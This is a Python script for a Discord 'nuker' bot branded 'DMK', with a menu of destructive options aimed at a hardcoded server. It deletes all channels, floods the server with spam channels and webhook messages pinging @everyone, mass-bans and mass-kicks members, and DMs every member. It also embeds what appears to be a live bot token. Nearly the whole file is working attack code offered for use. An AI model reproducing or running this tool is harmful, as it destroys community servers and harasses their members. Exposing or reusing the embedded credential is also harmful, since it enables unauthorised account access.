import discord
import pystyle

# Intents
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.webhooks = True
intents.guilds = True
intents.bans = True

# Client
client = discord.Client(intents=intents)

# Colors
cool = pystyle.Colors.red_to_yellow

# Config
token = "MTI0MzcxNTM2NjczMTkxMTI1OA.GWi8pK.SMWarL565cwIkYx375wKVVWy7FcDzSslaO1a0o"
guild_id = 1243991925619556412
nuke_message = "@everyone NUKED BY DMK https://discord.gg/X8PvAhDD"
channel_name = "nuked-by-dmk"
webhook_name = "nuked-by-dmk"
num_channels = 30
num_messages = 5

# Banner
banner = """
██████╗ ███╗   ███╗██╗  ██╗
██╔══██╗████╗ ████║██║ ██╔╝
██║  ██║██╔████╔██║█████╔╝ 
██║  ██║██║╚██╔╝██║██╔═██╗ 
██████╔╝██║ ╚═╝ ██║██║  ██╗
╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
"""
print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, banner, 1))
options = """
[1] Wizz and run!
[2] Create Channels
[3] Create Webhooks
[4] Spam Webhooks
[5] Delete Channels
[6] Delete Webhooks
[7] MassBAN
[8] MassKick
[9] DM all
[10] Exit
"""

print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, options, 1))

# Functions
input_option = input("Enter choice: ")

async def nuke_guild():
    guild = discord.utils.get(client.guilds, id=guild_id)
    if not guild:
        print("Guild not found.")
        return

    if input_option == "1":
        for channel in guild.channels:
            await channel.delete()
        for i in range(num_channels):
            await guild.create_text_channel(channel_name)
        for channel in guild.channels:
            webhook = await channel.create_webhook(name=webhook_name)
            for i in range(num_messages):
                await webhook.send(nuke_message)
        await guild.leave()

    elif input_option == "2":
        for i in range(num_channels):
            await guild.create_text_channel(channel_name)

    elif input_option == "3":
        for i in range(num_channels):
            await guild.create_text_channel(channel_name)
        for channel in guild.channels:
            webhook = await channel.create_webhook(name=webhook_name)

    elif input_option == "4":
        for channel in guild.channels:
            webhook = await channel.create_webhook(name=webhook_name)
            for i in range(num_messages):
                await webhook.send(nuke_message)

    elif input_option == "5":
        for channel in guild.channels:
            await channel.delete()

    elif input_option == "6":
        for channel in guild.channels:
            await channel.delete()
        for i in range(num_channels):
            await guild.create_text_channel(channel_name)
        for channel in guild.channels:
            webhook = await channel.create_webhook(name=webhook_name)
            await webhook.delete()

    elif input_option == "7":
        for member in guild.members:
            try:
                await member.ban(reason="NUKED BY DMK")
            except:
                pass

    elif input_option == "8":
        for member in guild.members:
            try:
                await member.kick(reason="NUKED BY DMK")
            except:
                pass

    elif input_option == "9":
        for member in guild.members:
            try:
                await member.send("NUKED BY DMK")
            except:
                pass

    elif input_option == "10":
        exit()

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")
    await nuke_guild()

client.run(token)